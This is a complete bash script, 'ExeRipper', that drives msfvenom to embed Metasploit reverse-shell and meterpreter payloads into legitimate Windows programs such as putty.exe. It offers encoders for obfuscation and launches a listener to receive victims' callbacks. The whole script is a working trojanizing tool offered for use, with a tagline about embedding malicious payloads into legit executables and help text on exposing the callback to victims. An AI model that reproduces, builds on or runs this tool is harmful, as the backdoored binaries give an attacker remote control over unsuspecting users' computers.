#!/usr/bin/env bash

RED='\033[0;31m'
WHITE='\033[1;37m'
BOLD='\033[1m'
RESET='\033[0m'

OUTDIR="$PWD/ExeRipperPayloads"
mkdir -p "$OUTDIR"

LHOST=""
LPORT=""
PUB_IP=""
PUB_PORT=""
EXE_PATH=""
PAYLOAD=""
ENCODER_FLAGS=""
BADCHAR_FLAGS=""
ITERATIONS=5

QUOTES=(
    '"Talk is cheap. Show me the code." --Linus Torvalds'
    '"Security is a process, not a product." --Bruce Schneier'
    '"The only truly secure system is one that is powered off." --Gene Spafford'
    '"Hacking is not a crime, it is an art form." --Unknown'
    '"There are no patches for human stupidity." --Kevin Mitnick'
    '"In security, the more you know the more you know you dont know." --Unknown'
    '"To hack is to explore, to understand, to manipulate." --Unknown'
    '"The quieter you become, the more you are able to hear." --Kali Linux'
    '"Amateurs hack systems, professionals hack people." --Bruce Schneier'
    'Woah Secret Dev Note: Happy Hacking Guys =--BeysonSec--= '
)

rand_quote() { echo "${QUOTES[$RANDOM % ${#QUOTES[@]}]}"; }

banner_0() {
cat << 'B0'
   .------------------.
   |             _ □ X|
   |------------------|
   | ──   ██████   ── |   ██████ ▄▄ ▄▄ ▄▄▄▄▄         █████▄  ▄▄ ▄▄▄▄  ▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄
   | ──   ██████   ── |   ██▄▄   ▀█▄█▀ ██▄▄          ██▄▄██▄ ██ ██▄█▀ ██▄█▀ ██▄▄  ██▄█▄
   | ──   ██████   ── |   ██▄▄▄▄ ██ ██ ██▄▄▄         ██   ██ ██ ██    ██    ██▄▄▄ ██ ██
   | ──   ██████   ── |
   | ──   ██████      |
   '------------------'

   Made By LowLevelAsCanGet
B0
}

banner_1() {
cat << 'B1'
  .------------------.
  |             _ □ X| ▓█████ ▒██   ██▒▓█████     ██▀███   ██▓ ██▓███   ██▓███  ▓█████  ██▀███
  |------------------| ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀    ▓██ ▒ ██▒▓██▒▓██░  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
  | ──   ██████   ── | ▒███   ░░  █   ░▒███      ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
  | ──   ██████   ── | ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄    ▒██▀▀█▄  ░██░▒██▄█▓▒ ▒▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄
  | ──   ██████   ── | ░▒████▒▒██▒ ▒██▒░▒████▒   ░██▓ ▒██▒░██░▒██▒ ░  ░▒██▒ ░  ░░▒████▒░██▓ ▒██▒
  | ──   ██████   ── | ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░   ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  | ──   ██████      |
  '------------------'
B1
}

banner_2() {
cat << 'B2'
.------------------.
|             _ □ X| d88888b db    db d88888b      d8888b. d888888b d8888b. d8888b. d88888b d8888b.
|------------------| 88'     `8b  d8' 88'          88  `8D   `88'   88  `8D 88  `8D 88'     88  `8D
| ──   ██████   ── | 88ooooo  `8bd8'  88ooooo      88oobY'    88    88oodD' 88oodD' 88ooooo 88oobY'
| ──   ██████   ── | 88~~~~~  .dPYb.  88~~~~~      88`8b      88    88~~~   88~~~   88~~~~~ 88`8b
| ──   ██████   ── | 88.     .8P  Y8. 88.          88 `88.   .88.   88      88      88.     88 `88.
| ──   ██████   ── | Y88888P YP    YP Y88888P      88   YD Y888888P 88      88      Y88888P 88   YD
| ──   ██████      | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'------------------'

B2
}

banner() {
    clear
    local idx=$(( RANDOM % 3 ))
    echo -e "${RED}"
    case $idx in
        0) banner_0 ;;
        1) banner_1 ;;
        2) banner_2 ;;
    esac
    echo -e "${RESET}"
    local q; q=$(rand_quote)
    echo -e "${WHITE}╔╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾╗${RESET}"
    printf "${WHITE}╏  %-92s╏${RESET}\n" "$q"
    printf "${WHITE}╏  %-92s╏${RESET}\n" "Embed Malicious Payloads Into Legit Exe Files"
    echo -e "${WHITE}╚╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾╝${RESET}"
    echo
}

pause() {
    echo
    read -rp $'\n\033[1;37m[ * ] Press ENTER to return to menu...\033[0m'
}

validate_lhost() {
    if [[ -z "$LHOST" || "$LHOST" == "0.0.0.0" ]]; then
        echo -e "${RED}    [!] LHOST cannot be empty or 0.0.0.0${RESET}"
        echo -ne "${WHITE}    LHOST${RESET}: "
        read -r LHOST
        validate_lhost
    fi
}

listener_config() {
    banner
    echo -e "${WHITE}${BOLD}  [1] LISTENER CONFIG${RESET}\n"
    echo -e "  [i] Sets your handler bind address, payload callback IP:port, and payload type."
    echo -e "  [i] Tip: Don't bind to 0.0.0.0 — that's stupid lol (learned the hard way)\n"

    echo -e "  ${WHITE}── Bind (what your machine listens on) ──${RESET}"
    echo -ne "${WHITE}    LHOST${RESET}: "; read -r LHOST
    validate_lhost
    echo -ne "${WHITE}    LPORT${RESET}: "; read -r LPORT
    echo

    echo -e "  ${WHITE}── Payload Callback (what the victim dials back to) ──${RESET}"
    echo -e "  [i] Same as LHOST:LPORT if no NAT — leave blank to copy bind values"
    echo -ne "${WHITE}    Public IP  ${RESET}: "; read -r PUB_IP
    echo -ne "${WHITE}    Public Port${RESET}: "; read -r PUB_PORT
    PUB_IP="${PUB_IP:-$LHOST}"
    PUB_PORT="${PUB_PORT:-$LPORT}"
    echo

    echo -e "  ${WHITE}── Payload ──${RESET}"
    echo -e "  [1] windows/x64/meterpreter/reverse_tcp"
    echo -e "  [2] windows/x64/shell_reverse_tcp"
    echo -e "  [3] windows/x64/meterpreter/reverse_https  (TLS)"
    echo -e "  [4] windows/x64/meterpreter/bind_tcp"
    echo -e "  [5] windows/meterpreter/reverse_tcp         (x86)"
    echo -e "  [6] windows/shell/reverse_tcp               (x86)"
    echo -e "  [7] windows/meterpreter/reverse_https       (x86)"
    echo -e "  [8] windows/meterpreter/bind_tcp            (x86)"
    echo -e "  [0] Keep current (${PAYLOAD:-none})\n"
    echo -ne "  ╰──────➤ "; read -r PCHOICE

    case $PCHOICE in
        1) PAYLOAD="windows/x64/meterpreter/reverse_tcp"  ;;
        2) PAYLOAD="windows/x64/shell_reverse_tcp"         ;;
        3) PAYLOAD="windows/x64/meterpreter/reverse_https" ;;
        4) PAYLOAD="windows/x64/meterpreter/bind_tcp"      ;;
        5) PAYLOAD="windows/meterpreter/reverse_tcp"       ;;
        6) PAYLOAD="windows/shell/reverse_tcp"             ;;
        7) PAYLOAD="windows/meterpreter/reverse_https"     ;;
        8) PAYLOAD="windows/meterpreter/bind_tcp"          ;;
        0) : ;;
        *) echo -e "${RED}    [!] Invalid — keeping current payload${RESET}" ;;
    esac

    echo
    echo -e "  ┌──────────────────────────────────────────────────"
    echo -e "  │  Bind      : $LHOST:$LPORT"
    echo -e "  │  Callback  : $PUB_IP:$PUB_PORT"
    echo -e "  │  Payload   : ${PAYLOAD:-not set}"
    echo -e "  └──────────────────────────────────────────────────"

    if [[ -n "$PAYLOAD" ]]; then
        echo
        echo -ne "  Start handler now? [y/N]: "; read -r START_NOW
        if [[ "${START_NOW,,}" == "y" ]]; then
            echo -e "\n  [+] Spawning handler — $PAYLOAD on $LHOST:$LPORT..."
            msfconsole -q -x \
                "use multi/handler; \
                 set payload $PAYLOAD; \
                 set LHOST $LHOST; \
                 set LPORT $LPORT; \
                 set ExitOnSession false; \
                 run"
        fi
    fi

    pause
}

payload_config() {
    banner
    echo -e "${WHITE}${BOLD}  [2] PAYLOAD & ENCODER CONFIG${RESET}\n"

    echo -e "  ${WHITE}── x64 Payloads ──${RESET}"
    echo -e "  [1] EXE  x64  windows/x64/meterpreter/reverse_tcp"
    echo -e "  [2] EXE  x64  windows/x64/shell_reverse_tcp"
    echo -e "  [3] EXE  x64  windows/x64/meterpreter/reverse_https  (TLS)"
    echo -e "  [4] EXE  x64  windows/x64/meterpreter/bind_tcp\n"
    echo -e "  ${WHITE}── x86 Payloads ──${RESET}"
    echo -e "  [5] EXE  x86  windows/meterpreter/reverse_tcp"
    echo -e "  [6] EXE  x86  windows/shell/reverse_tcp"
    echo -e "  [7] EXE  x86  windows/meterpreter/reverse_https"
    echo -e "  [8] EXE  x86  windows/meterpreter/bind_tcp\n"
    echo -e "  [0] Back\n"
    echo -ne "  ╰──────➤ "; read -r PCHOICE
    [[ "$PCHOICE" == "0" ]] && return

    local ARCH
    case $PCHOICE in
        1) PAYLOAD="windows/x64/meterpreter/reverse_tcp";  ARCH="x64" ;;
        2) PAYLOAD="windows/x64/shell_reverse_tcp";         ARCH="x64" ;;
        3) PAYLOAD="windows/x64/meterpreter/reverse_https"; ARCH="x64" ;;
        4) PAYLOAD="windows/x64/meterpreter/bind_tcp";      ARCH="x64" ;;
        5) PAYLOAD="windows/meterpreter/reverse_tcp";        ARCH="x86" ;;
        6) PAYLOAD="windows/shell/reverse_tcp";              ARCH="x86" ;;
        7) PAYLOAD="windows/meterpreter/reverse_https";      ARCH="x86" ;;
        8) PAYLOAD="windows/meterpreter/bind_tcp";           ARCH="x86" ;;
        *) echo -e "${RED}    [!] Invalid${RESET}"; sleep 1; payload_config; return ;;
    esac

    echo -e "\n  [+] Payload set: $PAYLOAD\n"

    echo -e "  ${WHITE}── Encoders ($ARCH) ──${RESET}"
    if [[ "$ARCH" == "x64" ]]; then
        echo -e "  [22] encoder/x64/xor_dynamic  (good all-rounder x64)"
        echo -e "  [42] encoder/x64/xor_context  (context-keyed x64)"
    else
        echo -e "  [66] encoder/x86/shikata_ga_nai  (polymorphic, strongest x86)"
        echo -e "  [88] encoder/x86/xor_dynamic     (XOR poly x86)"
        echo -e "  [99] encoder/x86/xor_poly        (XOR poly variant)"
    fi
    echo -e "  [ 0] No encoder\n"
    echo -ne "  ╰──────➤ "; read -r ECHOICE
    echo -ne "${WHITE}    Iterations (default 5)${RESET}: "; read -r ITERATIONS
    ITERATIONS="${ITERATIONS:-5}"

    if [[ "$ARCH" == "x64" ]]; then
        case $ECHOICE in
            22) ENCODER_FLAGS="-e encoder/x64/xor_dynamic -i $ITERATIONS" ;;
            42) ENCODER_FLAGS="-e encoder/x64/xor_context -i $ITERATIONS" ;;
             0) ENCODER_FLAGS="" ;;
             *) echo -e "${RED}    [!] Invalid, no encoder set${RESET}"; ENCODER_FLAGS="" ;;
        esac
    else
        case $ECHOICE in
            66) ENCODER_FLAGS="-e x86/shikata_ga_nai -i $ITERATIONS" ;;
            88) ENCODER_FLAGS="-e x86/xor_dynamic -i $ITERATIONS" ;;
            99) ENCODER_FLAGS="-e x86/xor_poly -i $ITERATIONS" ;;
             0) ENCODER_FLAGS="" ;;
             *) echo -e "${RED}    [!] Invalid, no encoder set${RESET}"; ENCODER_FLAGS="" ;;
        esac
    fi

    echo -e "${WHITE}    Bad chars (e.g. \\x00\\x0a, blank=none)${RESET}: "
    read -r BC
    if [[ -n "$BC" ]]; then BADCHAR_FLAGS="-b \"$BC\""; else BADCHAR_FLAGS=""; fi

    echo -e "\n  [+] Encoder  : ${ENCODER_FLAGS:-none}"
    echo -e "  [+] Bad chars: ${BC:-none}"
    pause
}

set_exe_path() {
    banner
    echo -e "${WHITE}${BOLD}  [3] ENTER EXE PATH${RESET}\n"
    echo -e "  [i] Path to the legit executable you want to backdoor (putty.exe, notepad++.exe, etc.)\n"

    echo -ne "${WHITE}    Path to legit EXE${RESET}: "; read -r EXE_PATH

    if [[ ! -f "$EXE_PATH" ]]; then
        echo -e "${RED}    [!] File not found: $EXE_PATH${RESET}"
        EXE_PATH=""
    else
        echo -e "  [+] EXE set: $EXE_PATH"
    fi
    pause
}

embed_payload() {
    banner
    echo -e "${WHITE}${BOLD}  [4] EMBED THAT SHIT${RESET}\n"

    local missing=0
    [[ -z "$PAYLOAD" ]]    && echo -e "${RED}    [!] No payload set — go to [1] or [2] first${RESET}"  && missing=1
    [[ -z "$EXE_PATH" ]]   && echo -e "${RED}    [!] No EXE path set — go to [3] first${RESET}"        && missing=1
    [[ -n "$EXE_PATH" && ! -f "$EXE_PATH" ]] && \
        echo -e "${RED}    [!] EXE not found: $EXE_PATH${RESET}" && missing=1

    local H="${PUB_IP:-$LHOST}"
    local P="${PUB_PORT:-$LPORT}"
    [[ -z "$H" ]] && echo -e "${RED}    [!] No IP set — run [1] first${RESET}"   && missing=1
    [[ -z "$P" ]] && echo -e "${RED}    [!] No port set — run [1] first${RESET}" && missing=1
    [[ "$missing" == "1" ]] && { pause; return; }

    local BASENAME; BASENAME=$(basename "$EXE_PATH" .exe)
    local OUTFILE="$OUTDIR/${BASENAME}_backdoored.exe"

    echo -e "  ┌──────────────────────────────────────────────────"
    echo -e "  │  Target EXE : $EXE_PATH"
    echo -e "  │  Payload    : $PAYLOAD"
    echo -e "  │  Encoder    : ${ENCODER_FLAGS:-none}"
    echo -e "  │  Bind       : $LHOST:$LPORT"
    echo -e "  │  Callback   : $H:$P"
    echo -e "  │  Output     : $OUTFILE"
    echo -e "  └──────────────────────────────────────────────────\n"

    echo -ne "  Confirm embed? [y/N]: "; read -r CONFIRM
    [[ "${CONFIRM,,}" != "y" ]] && echo -e "  [i] Aborted." && pause && return

    echo -e "\n  [+] Injecting..."
    eval msfvenom -p "\"$PAYLOAD\"" LHOST="$H" LPORT="$P" \
        $ENCODER_FLAGS $BADCHAR_FLAGS \
        -x "\"$EXE_PATH\"" -k \
        -f exe -o "\"$OUTFILE\""

    if [[ -f "$OUTFILE" ]]; then
        echo -e "\n  [+] Backdoored binary: $OUTFILE"
        echo -e "  [i] -k flag keeps original thread alive alongside payload"
        echo -e "  [i] Handler: msfconsole -x 'use multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; run'"
    else
        echo -e "${RED}    [!] msfvenom didn't produce output — check your args${RESET}"
    fi

    echo -ne "\n  Start listener now? [y/N]: "; read -r AUTOL
    if [[ "${AUTOL,,}" == "y" ]]; then
        echo -e "  [+] Spawning listener for $PAYLOAD on $LHOST:$LPORT (callback $H:$P)..."
        msfconsole -q -x \
            "use multi/handler; \
             set payload $PAYLOAD; \
             set LHOST $LHOST; \
             set LPORT $LPORT; \
             set ExitOnSession false; \
             run"
    fi

    pause
}

tips_menu() {
    banner
    echo -e "${WHITE}${BOLD}  [5] TIPS AND HELP${RESET}\n"

    echo -e "${WHITE}  ── Handler & Listener ──${RESET}"
    echo -e "  Tip 1: Don't bind your interface to 0.0.0.0 — that's stupid lol"
    echo -e "         (I learned that the hard way)"
    echo -e "  Tip 2: [1] Listener Config now handles everything — bind, callback, payload, and handler start"
    echo -e "         Run it once and you're set\n"

    echo -e "${WHITE}  ── Payload & Encoder ──${RESET}"
    echo -e "  Tip 1: x64 payloads can't use x86 encoders — vice versa too"
    echo -e "  Tip 2: You don't need to set an encoder, leaving it blank is fine :D\n"

    echo -e "${WHITE}  ── Connection ──${RESET}"
    echo -e "  Tip 1: Use your PUBLIC IP for the callback (e.g. 41.167.11.21, not 192.168.x.x)"
    echo -e "  Tip 2: LHOST = bind address (your LAN IP), Public IP = what victim calls back to"
    echo -e "  Tip 3: If clients aren't connecting, make sure the port is open/forwarded"
    echo -e "  Tip 4: Port 4444 for TCP, 8080 for HTTPS — the more you know :)\n"

    echo -e "${WHITE}  ── Misc ──${RESET}"
    echo -e "  Tip 1: If you don't have Metasploit:"
    echo -e "         git clone https://github.com/rapid7/metasploit-framework.git"
    echo -e "         gem install bundler && bundle install"
    echo -e "  Tip 2: If you're still using msfencode or msfpayload — please stop.\n"

    pause
}

main() {
    if ! command -v msfvenom &>/dev/null; then
        echo -e "${RED}[!] msfvenom not found. Install Metasploit first.${RESET}"; exit 1
    fi

    while true; do
        banner

        echo -e "${WHITE}${BOLD}  MAIN MENU${RESET}\n"
        echo -e "  [1] Listener Config       ← bind + callback IP:port + payload + handler"
        echo -e "  [2] Payload & Encoder     ← override payload / set encoder / bad chars"
        echo -e "  [3] Enter EXE Path"
        echo -e "  [4] Embed That Shit"
        echo -e "  [5] Tips And Help"
        echo -e "  [0] Exit\n"
        echo -ne "  ╰──────➤ "; read -r CHOICE

        case $CHOICE in
            1) listener_config ;;
            2) payload_config ;;
            3) set_exe_path ;;
            4) embed_payload ;;
            5) tips_menu ;;
            0) echo -e "${RED}    [x] ExeRipper out.${RESET}"; exit 0 ;;
            *) echo -e "${RED}  [!] Invalid${RESET}"; sleep 1 ;;
        esac
    done
}

main
